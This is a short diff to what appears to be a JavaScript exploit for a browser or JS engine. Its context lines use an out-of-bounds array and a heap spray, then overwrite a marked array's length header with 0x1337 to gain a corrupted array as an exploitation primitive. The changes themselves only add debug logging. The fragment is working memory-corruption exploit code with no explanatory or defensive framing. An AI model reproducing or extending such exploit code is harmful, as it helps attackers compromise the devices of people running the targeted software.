@@ -406,6 +406,8 @@ for (var i = 0; i < oob_arr.length; i += 2) {
 
     prim_oob_idx = i - 2
 
+    log (`Marked array length ${new BigInt(0, oob_arr[prim_oob_idx])}`)
+
     log("Corrupting marked array length...")
     // corrupt indexing header
     oob_arr[prim_oob_idx] = 0x1337
@@ -421,7 +423,8 @@ if (prim_oob_idx === -1) {
 // find index of corrupted array
 for (var i = 0; i < spray.length; i++) {
   if (spray[i].length === 0x1337) {
-    log(`Found corrupted array at spray[${i}]`)
+    log(`Found corrupted array at spray[${i}] !!`)
+    log(`Corrupted array length ${new BigInt(0, spray[i].length)}`)
 
     prim_spray_idx = i
     break
